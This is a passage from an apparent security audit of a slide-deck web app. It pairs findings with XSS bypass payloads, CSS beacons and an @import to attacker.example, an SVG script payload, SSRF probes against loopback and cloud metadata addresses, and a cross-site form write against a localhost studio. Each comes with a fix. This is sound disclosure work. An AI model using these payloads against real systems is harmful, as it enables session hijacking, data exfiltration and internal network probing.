and `scopeCss` at `:30-68`, which passes every `@` rule through unchanged (`:40-41`) and only prefixes selectors. The block is emitted with `el('div', ..., styleTag + resolveEscapeImages(sanitizeHtml(block.html), ctx))` (`:103-116`) and reaches the browser through `dangerouslySetInnerHTML` in the viewer, the editor, the live clone, print and present (`packages/viewer/src/SlideView.tsx:65,73`, `LiveClone.tsx:69`, `Editor.tsx:4012`, `apps/studio/src/routes/print.$deckId.tsx:313`, `present.$deckId.tsx:212` for the sprite), the standalone HTML file (`render/standalone.ts`), and Chromium in the function. The schema accepts any string for `html` and `css` (`packages/schema/src/blocks.ts:1587-1603`); anyone can write the block (F1) through `writeDeck`, `/api/actions/block.insert` or a bundle. Also `packages/render/src/text.ts:90-93` writes `<a href="${escapeAttr(run.link)}"` for any run link, and `blockLinkSchema` is `z.string().min(1)` (`packages/schema/src/text.ts:127-130`): no scheme check on links.

Bypass sketches, each a plain reading of the regular expressions:

1. `<img/src=x/onerror=alert(document.cookie)>`: HTML treats `/` as an attribute separator; the handler regex requires `\s+` before `on`, so `/onerror=` survives.
2. `<a href="jav&#x61;script:alert(1)">click</a>` or `&#106;avascript:`: the scheme regex looks for the literal `javascript:`; the browser decodes the entity in the attribute value and runs the script on click.
3. `<form action="javascript:alert(1)"><button>Continue</button></form>` and `<button formaction="javascript:...">`: `action` and `formaction` are not in the attribute list.
4. `<svg><a xlink:href="&#x6A;avascript:alert(1)"><text>x</text></a></svg>`: entity encoded scheme on the one attribute that is checked.
5. `<math><maction actiontype="statusline#http://x" xlink:href="javascript:...">`: not covered; browser support varies.
6. CSS: `@import url("https://attacker.example/steal.css");` passes `scopeCss`; `.ts-x-s-b { position: fixed; inset: 0; z-index: 2147483647; background: url("https://attacker.example/beacon?deck=...") }` paints over the whole editor chrome (the prefix scoping does not stop `position: fixed`) and beacons every viewer's visit. `@font-face { src: url(...) }` likewise.
7. `<base href="https://attacker.example/">` changes the resolution of every relative URL in the page after it, including the viewer's own scripts loaded later.
8. `<meta http-equiv="refresh" content="0;url=https://attacker.example/login">` redirects the viewer to a phishing page (the entity for the studio's session cookie once it exists).

With sessions (P1), a script running in the origin can call every server function as the victim, post comments in their name, change share settings, delete decks, and read the presence and comment data of every deck the victim can open. Today it can already run every server function (F1) and exfiltrate the victim's view of `/decks`.

Fix (P4), three layers, all three:

1. Isolate at render time in the studio and the viewer. Render each `html` block into `<iframe sandbox="" srcdoc="...">` with no `allow-scripts` and no `allow-same-origin`, so the content is in an opaque origin with scripts off (MDN, source S19: without `allow-same-origin` the resource is treated as being from a special origin that always fails the same origin policy; combining `allow-scripts` and `allow-same-origin` on same origin content is strongly discouraged). The `srcdoc` document carries the theme CSS the block needs and a `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src 'self' data: https://<store>; style-src 'unsafe-inline'; font-src 'self'">` so `@import` and `url()` to other hosts are refused inside the frame regardless of the sanitizer. The frame is sized to the block's box (the canvas model of round two already carries `pos`), so layout does not shift. The parent still applies the sanitizer (layer 2) so the block cannot break out of its box with `<meta refresh>` or `<base>`. The PPTX and PDF exporters rasterize the block in Chromium as they do today (docs/pptx.md); the standalone HTML file embeds the same sandboxed frame.
2. Sanitize with a real parser at write time and again at render time. DOMPurify 3.4.15 through jsdom on the server (source S20: jsdom is the supported DOM; keep jsdom current; happy-dom is not considered safe), profile `USE_PROFILES: { html: true, svg: true }`, `FORBID_TAGS: ['script','iframe','object','embed','base','meta','link','style','form','input','button','textarea','select','math']` (the block's CSS lives in `css`, not in `<style>`), `FORBID_ATTR: ['style']` unless the style attribute is passed through a CSS value allowlist, `ALLOWED_URI_REGEXP` limited to `https:`, `data:image/`, `#` and `assets/`, `ALLOW_UNKNOWN_PROTOCOLS: false`. Run it in `applyWrite` for `block.insert`, `block.set`, `slide.replace` and `slide.update` on `html` blocks, in the bundle importer, and in `renderHtmlEscape`. Store the sanitized markup, and record `htmlSanitized: true` on the block so the linter can flag unsanitized legacy content. DOMPurify does not sanitize CSS text (source S20 says the README does not state CSS parsing), so the `css` field gets its own pass: a small CSS tokenizer that drops `@import`, `@font-face`, `@namespace`, any `url()` not under `assets/`, `expression(`, `behavior:`, `-moz-binding`, `position: fixed` and `position: sticky`, and any declaration with `!important` on `z-index`. Keep `scopeCss` after that.
3. Scheme check on every link. `run.link` and `BlockLink` strings accept `https:`, `http:`, `mailto:`, `tel:` and the slide link forms only, checked in the schema (`z.string().refine`) and again in `renderRuns`, and rendered with `rel="noopener noreferrer"` (today `rel="noreferrer"`, which implies `noopener` in current browsers, source: the HTML standard's `noreferrer` definition is the reason, not verified here; keep both words).

Policy: in a deck shared beyond its owner (any link mode other than restricted, or any editor besides the owner), `html` blocks render only when the owner has set `deck.defaults.allowHtmlBlocks` (an owner only setting, off by default); otherwise the block renders as its `note` in a plate. Agents may still write the block through the bearer for their own decks. This is the "refusing the block in shared decks" option the brief names, kept as a switch rather than a removal because the GT deck's imported escape blocks are the reason the block exists.

**F5 SVG assets are stored XSS in the app origin. High.**

Evidence: `packages/store/src/bundle.ts:159-199` accepts `svg` as an asset kind by extension and by a text sniff (`<?xml`, `<svg`, `<!--`); `apps/studio/src/routes/decks.$deckId.assets.$.ts:16-24` maps `.svg` to `image/svg+xml` and `:35-40` streams it with `cache-control` only, no `Content-Disposition: attachment`, no `X-Content-Type-Options`, no CSP; `packages/headless/src/capture/intake.ts:213` writes the raw input bytes as `assets/<id>.svg` when sharp reports `format: 'svg'` and the asset is not two tone (`capture/shared.ts:157-181`). The Blob host, by contrast, serves every blob with `content-security-policy: default-src "none"`, `x-frame-options: DENY`, `x-content-type-options: nosniff` and a content disposition (source S8), so an SVG served from the Blob URL cannot run script; the app's own route has none of that.

Exploit sketch: a bundle with `assets/logo.svg` containing `<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('/_serverFn/...')</script></svg>`, uploaded through the `/decks` form; the attacker sends a victim `https://turboslide.vercel.app/decks/<id>/assets/logo.svg`; the script runs in the app origin. The `<img>` tags the renderer emits do not run SVG scripts, so the hosted seed's twins are safe as pictures; the direct navigation is the problem.

Fix (P5): on hosted transports refuse SVG uploads, or rasterize them through sharp to PNG at the twin sizes and keep only the raster (sharp reads SVG through librsvg; source S21 lists SVG among the accepted inputs), or sanitize with DOMPurify's svg profile and still serve as attachment. Serve every file under `/decks/:id/assets/*` with `X-Content-Type-Options: nosniff`, `Content-Disposition: attachment` for `image/svg+xml` and `application/json`, `Content-Security-Policy: sandbox; default-src 'none'`, and prefer the Blob URL (a 302, already the path for decks made on another instance, `decks.$deckId.assets.$.ts:42-48`) for every hosted asset so the app origin never serves user bytes. Add an `assetProblem` style sniff to the intake path before sharp (F17 depends on it too).

**F10 Error bodies and headers leak server details. Low.**

Evidence: `routes/api/render.$slideId.ts:94-99,135-139` return the caught `error.message` (worker messages include absolute `/tmp/turboslide/...` paths and CLI stderr); `:129` puts the whole `RenderRecord` JSON (with absolute image paths) in `x-turboslide-record`; `routes/api/export.$deckId.ts:257-262`; `capture/shared.ts:149` throws `no file at ${path}` with the resolved absolute path, which `runDeckAction` returns to the browser as the server function error.

Fix: map errors to fixed messages by class (`RangeError` 404 "no such deck or slide", `TypeError` 400 with the validator's pointer only, everything else 502 "the render failed; request id <id>") and log the detail with the request id; drop absolute paths from records that leave the server (`image` becomes the facade URL, as `renderUrl` already does for the action outputs).

### 6.3 Server side requests, files and uploads

**F3 Server side request forgery and local file read through `asset.add`, with `asset.capture` and the {url} upload as the neighbours. High.**

Evidence: `packages/headless/src/capture/shared.ts:73-82`:

```ts
export const DEFAULT_ALLOW_HOSTS: ReadonlyArray<string> = [
  'localhost',
  '127.0.0.1',
  '::1',
  'generaltranslation.com',
  'prototemplate.com',
  'glyphfield.com',
  'commons.wikimedia.org',
  'upload.wikimedia.org',
];
```

`hostMatches` at `:84-88` accepts any subdomain (`h.endsWith('.' + a)`); `readInput` at `:122-152` fetches with `redirect: 'follow'` (`:145`), no timeout, no size limit on the stream before `arrayBuffer()` (the 25 MB check runs after the whole body is in memory, `:147-149`), and for anything that is not `data:` or `http(s)://` resolves a filesystem path, absolute paths included (`:148-151`). `packages/schema/src/actions.ts:1359-1363` documents `file` as "A path on the machine". `asset.add` is in `SERVER_SIDE_WINDOW_ACTIONS` (`server/agent-actions.ts:39-50`), so the unauthenticated `runDeckAction` server function runs it; `deps.cwd` is `repoRoot()`, the overlay under `/tmp` when hosted (`server/actions.ts:346`). `asset.capture` (bearer only, `transports: noWindow`) navigates Chromium to any allowlisted URL and screenshots it (`capture/page.ts:92,175`). The `{ url }` bundle upload is the well built exception (`bundle-core.ts:258-306`).

Exploit sketches:

1. Loopback probing from the function: `runDeckAction({ action: 'asset.add', input: { url: 'http://127.0.0.1:9001/2018-06-01/runtime/invocation/next', role: 'capture', alt: 'x', baseRevision: n } })`. The request is made; the answer must decode as an image to be stored, but the error text distinguishes an HTTP status from a connection refusal, which is a port scanner. What listens on loopback inside a Vercel function is not documented publicly (section 12).
2. Redirect through an allowlisted host: any open redirect or user controlled redirect on `*.generaltranslation.com`, `*.prototemplate.com`, `*.glyphfield.com` or Wikimedia (for example a Wikimedia `Special:Redirect` or a commons file redirect) sends the fetch to `http://169.254.169.254/` or a private address; `redirect: 'follow'` does not re-check the host.
3. DNS rebinding: a subdomain of an allowlisted host that the attacker controls (a dangling CNAME, or the attacker's own zone under a partner domain) resolves to a private address; the allowlist checks the name, never the address (OWASP SSRF sheet, source S18: resolve every A and AAAA record and validate the addresses).
4. Local image read: `file: '/tmp/turboslide/decks/<other deck>/assets/photo.jpg'` copies another deck's twin into the attacker's deck; every deck is public today so the gain is nil, but the pattern generalizes to any image on the function (the seed's twins, `/var/task` assets) and, if a future feature writes anything image shaped from a secret, to that.
5. Resource exhaustion: a URL on an allowlisted host that streams forever or never answers holds the invocation to the 300 s or 800 s limit and buffers memory until 4.5 MB of response arrives or the function dies (there is no `AbortSignal`).

Chromium as a second SSRF client (F18): every render and export loads the deck's markup with `--disable-web-security` and `--allow-running-insecure-content` (`packages/headless/src/launch.ts:121-130`), so an `html` block's `<img src="http://10.0.0.1/...">`, a CSS `url()` or a `<link rel="stylesheet">` is fetched by the function's Chromium during a thumbnail, and the screenshot returns the bytes to the attacker through the open `?w=` thumbnail route.

Fix (P6):

1. Refuse `file` on every hosted transport: the HTTP, MCP and window dispatchers pass `allowPaths: false` and `readInput` throws `TypeError` for a path when the option is false; the CLI keeps paths for the local store.
2. Hosted allowlist: drop `localhost`, `127.0.0.1`, `::1`; keep the exact hosts the product needs and read `deck.json` `captureHosts` only for the owner's own decks; match exact hostnames or an explicit `*.` prefix, never a bare suffix.
3. Resolve and pin: build the outbound `fetch` on an `undici` `Agent` whose `connect.lookup` resolves the hostname once, refuses any address in `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`, `100.64.0.0/10`, `0.0.0.0/8`, `224.0.0.0/4`, `::1/128`, `fc00::/7`, `fe80::/10`, `::ffff:0:0/96` mapped forms, and connects to the resolved address so the name cannot rebind between check and connect (the pattern the `link-preview-js` fix used, source S22; `request-filtering-agent` implements the same for `http.Agent` clients and states that Node's built in fetch does not take an `http.Agent`, source S23). `redirect: 'manual'`, at most three hops, each hop re-checked. `AbortSignal.timeout(20_000)`. Read the body with a counting stream that aborts past 25 MB.
4. Chromium egress: `context.route('**/*', ...)` that allows `file://` under the job directory and the deck's asset folder, `data:` and `blob:`, and aborts everything else during renders, thumbnails and exports; `asset.capture` and `material.capture` get their own contexts with the allowlist applied per request and the private ranges blocked at the DNS layer of the function (Chromium resolves names itself, so the route handler should resolve the hostname with the same pinned lookup and abort on a private answer).

**F16 Bundle import inflates up to 400 MB in memory on a default sized function, and imports unverified history. Medium.**

Evidence: `store/unpack.ts:73` (`maxTotalBytes: BUNDLE_MAX_BYTES * 2`, 400 MB); `store/zip.ts:189-246` decodes every entry into memory before any is written; `routes/api/decks.bundle.ts:116-118` reads the whole body with `arrayBuffer()`; the route is not in the `HEAVY` function rules (`vite.deploy.config.ts` `functionRules` name only `/api/export/**`, `/api/render/**`, `/_serverFn/**`), so it runs with the default memory; Vercel caps request bodies at 4.5 MB for the function itself (source S6), so the direct upload is bounded there and the `{ url }` path is the one that reaches 200 MB. `versions/*.json` and `.turboslide/*.json` documents are accepted with only a digest and `.json` check (`unpack.ts:105-110`), so a bundle carries a fabricated version log and lease file into a replaced deck.

Fix: stream the zip from Blob to `/tmp` and read entries lazily with a per entry cap; move the bundle route into the heavy rule; cap bundles per identity per day and total bytes per identity (section 7.5); validate every `versions/<n>.json` against `versionRecordSchema` and re-derive contiguity, drop `leases.json` and `.turboslide/` from imports, and stamp the imported records' author as the importer.

**F17 Vulnerable dependencies in the image and export paths. High.**

Evidence: `pnpm audit --json` on 2026-09-13 (673 dependencies): three high advisories. `sharp` 0.35.0 at the root, `apps/cli`, `packages/effects`, `packages/export`, `packages/headless` (GHSA-rgj7-g3m4-5g8c, source S24: libheif heap buffer overflows, CVSS 8.9, reachable through AVIF input, remote code execution possible on glibc Linux, fixed in 0.35.4, mitigation `sharp.block({ operation: ['VipsForeignLoadHeif'] })`). `image-size` 1.2.1 through `pptxgenjs` 4.0.1 in `packages/export` (GHSA-w3rx-r6r6-pgpr and GHSA-5p2g-fcmc-qvqq, source S25: infinite loops in the ICNS, JXL and HEIF parsers block the event loop; the pnpm advisory says patched in 2.0.3, the GitHub page read today says no patched version, see section 12). Turboslide hands untrusted bytes to sharp in `imageInfo` before any format check (`capture/shared.ts:157-166`) and, through the bundle importer, sniffed png, jpeg, gif and webp only (`store/bundle.ts:184-222`); the exporter hands picture bytes to pptxgenjs, which measures them with `image-size`. Other pins worth watching: `@sparticuz/chromium` 147.0.2 (Chromium 147; whether a newer stable exists on 2026-09-13 is not verified here), `nitro` `3.0.260903-beta`, `@tanstack/react-start` 1.168.50 with `start-server-core` 1.169.32 installed.

Fix (P3): bump `sharp` to 0.35.4 in the catalog and call `sharp.block({ operation: ['VipsForeignLoadHeif', 'VipsForeignLoadJxl'] })` once at process start in `effects/io.ts`; add a pnpm `overrides` entry for `image-size` to a version past 2.0.2 (or replace the pptxgenjs measurement by passing explicit `w` and `h`, which the exporter already knows from the render records); sniff magic bytes before sharp everywhere and accept png, jpeg, webp, gif only on hosted transports; set `limitInputPixels` explicitly (default 268402689, source S21) to the sheet's needs (for example 64 megapixels) and `failOn: 'error'`; add `pnpm audit --prod --audit-level=high` to `scripts/check.mjs` with an allowlist file for accepted advisories; track Chromium and Nitro releases.

### 6.4 Resource consumption and cost

**F6 Unmetered Chromium, sharp and Blob work. High.**

Evidence: `routes/api/render.$slideId.ts:50-62` (`?w=` bypasses the bearer; `:83-99` renders on a cache miss for any deck and slide); `server/render.ts:67-121` (`renderSlideImagesFn`: every slide, both themes, 2x, sequential per instance); `server/thumbs.ts:296-380` (`warmThumbs`, one 300 s job); `server/download.ts:151-158,176-182,525-543` (`syncExport` 780 s, `startBatchedExport`, `runBuild` 600 s); `server/export-sync.ts:82` (`SYNC_EXPORT_TIMEOUT_MS = 780_000`); `vite.deploy.config.ts` (`HEAVY = { maxDuration: 800, memory: 3009 }` for `/api/export/**`, `/api/render/**`, `/_serverFn/**`); `server/decks.ts:201-203` (`listDecks` syncs every deck per visit); docs/hosting.md section 4 (about 290 Blob puts per GT deck copy). The browser slot serializes renders per instance (`export-batch.ts:218-224`), and fluid compute runs many invocations per instance and scales to 30,000 concurrent (source S6), so the serialization bounds nothing across instances. Billing is active CPU and provisioned memory time (source S5, S6); Chromium rendering is CPU bound.

Exploit sketch: a loop of `renderSlideImages({ deckId: 'gt-brand', slideIds: 'all', themes: ['light','dark'], scale: 2 })` from a hundred IPs, or `GET /api/render/<slide>?deck=<id>&theme=dark&w=640` over every slide of every deck with a cache busting revision (`?r=` is only a browser cache key; the server cache is per revision, so a write per second from the same attacker invalidates it). Each call is minutes of 3 GB function time.

Fix (P2): rate limits per IP at the edge (section 7.4), quotas per identity in the application (section 7.5), a hard budget in the function (refuse exports and whole deck renders when the identity's daily quota is spent; return 429 with `Retry-After`), the thumbnail route gated to identities that may view the deck (a signed, short lived URL from the page in place of the open `?w=`), renders and exports queued with concurrency one per identity, a monthly spend alert on the Vercel team (Vercel's spend management is a dashboard setting, not verified here).

**F7 Storage exhaustion and listing amplification. High.**

Evidence: `server/bundle.ts:48-53` (upload ticket for anyone); `routes/api/decks.bundle.ts` (200 MB per bundle, unlimited bundles); `server/decks.ts:257-271` (unlimited `createDeck`); `store/file-store.ts` writes `versions/<n>.json` per write with no retention; `store/snapshots.ts:22,30` (snapshots kept for the newest 50 records and every named version, others pruned after 5 minutes); `store/hosted.ts` list syncs every deck for every `/decks` visit. No cap on document size beyond the 1 MB agent body (server function bodies are capped only by Vercel's 4.5 MB).

Fix: per identity quotas (decks, bytes, versions), a per deck size cap (for example 25 MB of documents and 200 MB of assets), version retention (keep every record for 30 days, then thin to named versions and one per day), a `/decks` page that reads a per user index rather than syncing the world, and the bundle upload behind P1.

**F14 Unbounded in memory registries and a hijackable page session. Low.**

Evidence: `packages/agent/src/http/sessions.ts:130,148-166` (`entries` Map, any `state` object stored); `apps/studio/src/server/sessions.ts:74-91` (`attachFn` open to any browser); `sessions.ts:192-196` (`attached()` returns the most recently seen session, so a fake page receives `view.goto` commands meant for the real one); `packages/mcp/src/http.ts:79,107-140` (one SDK server per session, swept after 30 idle minutes, no cap; bearer required).

Fix: cap sessions per identity and per instance (for example 8 pages per identity, 256 per instance), cap `state` at 8 KB, bind a page session to the identity that attached it and only deliver commands to pages of the same identity as the agent's owner, cap MCP sessions per token at 16 and expire at 15 idle minutes.

**F9 Export cancel without the bearer, keyed by a job id with 32 random bits. Low.**

Evidence: `routes/api/export.$deckId.ts:306-310` (`cancel` skips `unauthorized`); `packages/export/src/batch/plan.ts:225-233` (`jobIdNow`: `b<time36>-<8 hex>`, four random bytes). The comment explains the `pagehide` `keepalive` reason (SPEC-2 0.45).

Fix: keep the header free cancel but require a cancel token the start answer hands the page (HMAC over the job id, the same pattern as the bundle tickets), or move the cancel to `navigator.sendBeacon` with a body carrying that token.

### 6.5 Platform and configuration

**F8 The Blob store is public with predictable paths. High after P1.**

Evidence: `packages/store/src/blob-vercel.ts:24-26,88` (`access` public unless `TURBOSLIDE_BLOB_ACCESS=private`), `:149` (`addRandomSuffix: false`); docs/hosting.md lines 128-131 ("One Vercel Blob store, public access, holds each deck under `decks/<id>/`") and 252 ("The store must be public for the twins' URLs to serve to browsers"); `server/export-sync.ts:117-142` (exports stored under `exports/<deckId>/<jobId>/` at public URLs); `bundle-core.ts:170-183` (bundles under `bundles/<deckId>/<stamp>-<random>/`). Vercel documents the public URL form `https://<store-id>.public.blob.vercel-storage.com/<pathname>` and says public URLs are "unique and hard to guess when you use the `addRandomSuffix: true` option" (sources S7, S8). Turboslide does not use the suffix for documents, so knowing the store hostname (it appears in every asset URL the app serves through the 302 at `decks.$deckId.assets.$.ts:42-48` and in every stored export URL returned by `jsonBody`) gives every document of every deck, the whole version log, the lease file with author labels, and every export ever stored, without touching the app.

Fix (P9): two stores. A private store for `decks/<id>/deck.json`, `slides/`, `versions/`, `leases.json`, `snapshots/`, `exports/` and `bundles/`, read through the function with the authorization of P1 (or through Vercel Blob signed URLs, which the changelog "Signed URLs are now available for Vercel Blob" announces and this report did not read, section 12). A public store for asset twins only, written with `addRandomSuffix: true` and the URL recorded in the asset record, so a twin's URL is a capability and a deck's assets cannot be enumerated. Until the split, set `TURBOSLIDE_BLOB_ACCESS=private` for a new store and serve twins through the assets route (cost: function time per image; docs/hosting.md section 4 has the price model). Enable the Blob store firewall (source S8: WAF rules on a store through `vercel-blob-default-project`) to rate limit hotlinking of the public twins.

**F11 Forwarded host trust and the localhost rule. Low.**

Evidence: `packages/agent/src/http/auth.ts:27-37` (`X-Forwarded-Host` first), `:40-52` (`0.0.0.0` counts as local at `:48`), `:88` (open without a token when the host reads as local). On Vercel the header is set by the platform and "identical to the host header" (source S4), so a client cannot spoof it there. On the `node-server` preset behind a proxy that forwards client headers, or on any deployment that forgot the token, `X-Forwarded-Host: localhost` opens the agent surface.

Fix: trust `X-Forwarded-Host` only when `TURBOSLIDE_TRUST_PROXY=1`; treat the no token case as open only when the listening socket is bound to a loopback address (the studio knows its own bind address in `vite.config.ts`), else refuse; drop `0.0.0.0` from the local list.

**F13 Cross site writes against a local studio through the agent routes. Medium.**

Evidence: `packages/agent/src/http/dispatch.ts:56-86` (`readJsonBody` parses `request.text()` regardless of `Content-Type`); `packages/mcp/src/http.ts:162-175` (`request.json()` on any POST; no Origin check; the SDK's `enableDnsRebindingProtection`, `allowedHosts` and `allowedOrigins` exist in `webStandardStreamableHttp.d.ts:84-96` and are not set in `routes/mcp.ts:22-54`); `auth.ts:88` (localhost mode without a token). The MCP specification requires servers to validate `Origin` on every connection to prevent DNS rebinding and to bind to loopback locally (source S26). A page on any site can submit `<form method="POST" enctype="text/plain" action="http://localhost:4321/api/actions/slide.remove?deck=gt-brand">` with a text/plain body shaped as JSON; the browser sends it without CORS preflight, the route parses it as JSON, and the write lands on the developer's checkout. `Host` is `localhost:4321`, so the localhost rule admits it. With DNS rebinding the same works against `/mcp`.

Fix: on `/api/actions`, `/api/agent` and `/mcp` refuse any request carrying an `Origin` header that is not the studio's own origin (agents send none), require `Content-Type: application/json` for JSON bodies, set `allowedHosts: ['localhost:4321','127.0.0.1:4321']` and `enableDnsRebindingProtection: true` on the MCP transport, and generate a per checkout token in `.turboslide/token` that the CLI reads so the local surface is also bearer gated by default.

**F15 No security headers and no Content Security Policy. Medium.**

Evidence: a grep for `content-security-policy`, `x-frame-options`, `strict-transport-security`, `referrer-policy`, `permissions-policy`, `frame-ancestors` over `apps/studio/src` and `packages/*/src` finds nothing outside the two attachment routes that set `x-content-type-options: nosniff` (`download.$token.ts:30`, `export.$deckId.ts:117,298`, `decks.$deckId.bundle.ts:82`); `routes/__root.tsx:98,101` renders an inline boot script and an inline style block, so a CSP needs nonces; `/embed/:id` is designed to be framed by Prototemplate (`routes/embed.$deckId.tsx:7-8`). Whether Vercel adds HSTS on `*.vercel.app` by default was not verified (section 12).

Fix (P7), section 7.3 has the header set and the middleware.

**F18 Chromium without a sandbox inside the function that holds the secrets. High.**

Evidence: `packages/headless/src/launch.ts:100-130` (the kept switches: `--single-process`, `--no-zygote`, `--in-process-gpu`, `--disable-setuid-sandbox`, `--disable-web-security`, `--allow-running-insecure-content`; Playwright adds `--no-sandbox` because `chromiumSandbox` defaults to false, source S27), `:412` (`args` merged into the launch); docs/hosting-chromium.md section 2 "The switches" (the same list with the reasons), section 3 (the render runs in the function's process; a crash takes the request); `vite.deploy.config.ts` (the function is one bundle: the studio, the store with `BLOB_READ_WRITE_TOKEN`, the bearer, and Chromium). Chromium 147 is pinned (`pnpm-workspace.yaml` `@sparticuz/chromium: 147.0.2`). The rendered document is attacker controlled through F1 and F4 (an `html` block is markup; a `picture` is bytes through sharp first, but the standalone and print paths also render user CSS).

Exploit sketch: a renderer bug in Chromium 147 reachable from HTML or CSS, triggered by a deck the attacker writes and a thumbnail request the attacker sends; without the sandbox the exploit runs as the function's user with `process.env` readable, so `BLOB_READ_WRITE_TOKEN` and `TURBOSLIDE_TOKEN` leave. Chromium's own documentation describes the sandbox as the layer that contains a compromised renderer; the page could not be fetched today (section 12), so the claim rests on general knowledge.

Fix (P8): run renders in a function or the worker image that has no Blob token and no bearer (Vercel environment variables are per project, so a second project `turboslide-render` with only the read side of what it needs, reached through a signed internal request; or the Docker worker `apps/render-worker` that docs/hosting.md section 6 and SPEC 3.3 item 7 already describe); deny egress from the render contexts (F3 fix step 4); drop `--disable-web-security` and `--allow-running-insecure-content` (the renderer loads `file://` documents whose subresources are `file://` and `data:`; test the two flags off); keep Chromium current by tracking `@sparticuz/chromium` releases; treat a render crash as a security event in the logs.

**F19 Secret handling. Low.**

Evidence: `packages/store/src/blob-vercel.ts:84-87` requires `BLOB_READ_WRITE_TOKEN` although Vercel now authenticates connected projects with a rotating OIDC token by default and recommends the static token only outside Vercel or for client upload tokens (source S7); `server/tokens.ts:39-41` and `bundle-core.ts:64-74` fall back to a per process random key when `TURBOSLIDE_DOWNLOAD_SECRET` is unset (a token minted on one instance fails on another; functional); the download `used` map is per instance (`tokens.ts:32-44`), so a one time token can be spent once per instance. No secret is committed; `.env` is ignored; docs name the store id, which Vercel calls an identifier and not a secret (source S7).

Fix: let the SDK use OIDC on Vercel (drop the explicit token when `VERCEL_OIDC_TOKEN` is present), set `TURBOSLIDE_DOWNLOAD_SECRET` on every environment, keep the one time set in Redis when P2 introduces it, rotate `TURBOSLIDE_TOKEN` when P10 replaces it with per agent tokens, and never log `process.env`.

**F12 One shared static bearer for every agent. Medium.**

Evidence: `packages/agent/src/http/auth.ts:75-87`; docs/hosting.md section 6 (`openssl rand -hex 32`, set on production and preview). The token grants every action including `deck.remove` on every deck; a leak from one laptop's `~/.config/turboslide/hosts.json` compromises the deployment; there is no rotation without redeploying every agent, no scope, no per agent name for the audit trail beyond a self declared `runId`.

Fix (P10): agent tokens as records (id, name, owner identity, scopes read, write, export, admin, created, last used, revoked) stored hashed (SHA-256 of a 32 byte random token with a `ts_` prefix so scanners recognize it); the bearer looked up by hash; the author derived from the record; 401s rate limited per IP (R7). Keep `TURBOSLIDE_TOKEN` as the bootstrap admin token to mint the first records.

### 6.6 Logging and observability

**F20 No security logging or alerting. Medium.**

Evidence: `routes/api/actions.$action.ts:48-54` logs one line per dispatch only when `TURBOSLIDE_AGENT_LOG=1`; server functions log nothing per request; `server/root.ts:86-88` logs hosting events. Vercel runtime logs carry request id, path, status, duration, user agent and firewall verdict (source S13), are retained one day on Pro (30 days with Observability Plus), and firewall alerts fire only for platform DDoS detections above 100,000 requests in 10 minutes (source S14). Drains are Pro and Enterprise (source S15).

Fix (P10, section 7.11).

### 6.7 Items verified as low risk or not exploitable

- Path traversal in downloads, job files, assets and bundles: none found (section 5).
- Command injection: none (argument arrays).
- The `validate.run` path argument is confined to `decks/<id>` (`server/actions.ts:521-532`).
- `readRenderUrl` reads any absolute path it is given when the string does not start with `/api/render/` (`server/actions.ts:147-149`); its callers are the MCP server's own resource resolution (`packages/mcp/src/server.ts:101-102,127,173`), which builds paths from the render cache, so a client does not choose the path. Bearer gated. Marked F23 for a test that pins the behaviour.
- Ticket replay: bundle tickets have no nonce and verify for ten minutes anywhere (`bundle-core.ts:93-120`); by design, and harmless once the routes check the identity behind the ticket.

## 7. Rate limiting on Vercel

### 7.1 The platform layer: WAF rate limiting rules

Facts read on 2026-09-13 (source S2, S3, S9, S10, S11):

- A custom rule matches request fields (path, method, IP, geo, user agent, headers, query, cookies, JA3 and JA4 fingerprints) and takes an action: log, deny, challenge, bypass, redirect, or rate limit with a follow up action (default 429, or log, deny, challenge). Rules apply on publish without a redeploy and can be reordered; a rule can be described in natural language and the dashboard generates it (source S9).
- Rate limit counting keys: IP and JA4 digest on Hobby and Pro; User Agent and arbitrary header keys on Enterprise. Algorithm: fixed window on Hobby and Pro, token bucket on Enterprise. Window 10 s to 10 min on Hobby and Pro, up to 1 h on Enterprise. Rules: 1 per project on Hobby, 40 on Pro, 1000 on Enterprise. Included: 1,000,000 allowed requests on Hobby, usage based on Pro (source S2).
- Counters are per region: "traffic matching a given rate limit key in multiple regions can exceed the limit you configure for any single region" (source S2). The function runs in `iad1` by default, but the WAF counts at the edge region the client hit.
- Persistent actions: a challenge, deny or rate limit action can block the client IP for a chosen period (defaults to 1 minute), evaluated before the request reaches the application (source S9).
- Management: the dashboard; the CLI (`vercel firewall rules add --ai "Rate limit /api to 100 requests per minute by IP"`, `vercel firewall ip-blocks block`, `vercel firewall attack-mode enable --duration 1h`, changelog of 2026-05-12, source S10); the REST API `PATCH /v1/security/firewall/config?projectId=` with actions `rules.insert`, `rules.update`, `rules.remove`, `rules.priority` and more (source S11); `vercel.json` `routes[].mitigate` supports only `deny` and `challenge` (source S9); a firewall templates repository exists with an "API rate limit" template (source S28, format not read).
- Managed rulesets: the OWASP core ruleset (log or deny per rule), Bot Protection (challenge non browser traffic that claims to be a browser; verified bots excluded; off by default), AI bots (log or deny) (source S29, S30). Bot protection does not work behind a reverse proxy.
- Deployment Protection is separate: Vercel Authentication on all plans for non production URLs, "All Deployments" including production on Pro and Enterprise, Password Protection as a paid add on, Trusted IPs on Enterprise (source S1).

What this gives Turboslide: a first line that costs no code, keyed by IP or JA4, with per region counters (so set limits about a third lower than the intended global limit, and expect a distributed attacker to get up to the per region limit in each of the regions it reaches). It cannot key on Turboslide's identity, deck or action (a header key would need Enterprise, and the server function path is one path for every function), so it is the coarse layer.

### 7.2 The SDK layer: @vercel/firewall

`checkRateLimit('<rate limit id>', { request, rateLimitKey })` counts against a dashboard rule whose first condition is `@vercel/firewall` with the given id; the default key is the client IP and `rateLimitKey` replaces it entirely, so a compound key such as `${identityId}:${ip}` keeps per caller separation; the answer is `{ rateLimited }` and the code returns 429 (source S3). Counters are per region as above. It runs inside the function, so it cannot save the invocation cost, but it can key on identity and deck, which the dashboard rules cannot on Pro. Preview deployments need Protection Bypass for Automation and exposed system environment variables for the SDK to work (source S3).

### 7.3 The application layer

- Upstash Redis through the Vercel Marketplace with `@upstash/ratelimit`: HTTP based, fixed window, sliding window and token bucket algorithms, an ephemeral in memory cache for blocked keys, a timeout that fails open, analytics (source S31). Global counters, exact quotas, atomic increments, and a place for the one time token set, the session store and the per identity budgets. This is the recommended store for everything that must be exact or global.
- In memory per instance: fluid compute shares one instance across many invocations, so a Map on `globalThis` (as the session registries already do) counts per instance, not globally; useful only as a last resort and for smoothing bursts inside one instance. It resets on scale out and never protects against a distributed attacker.
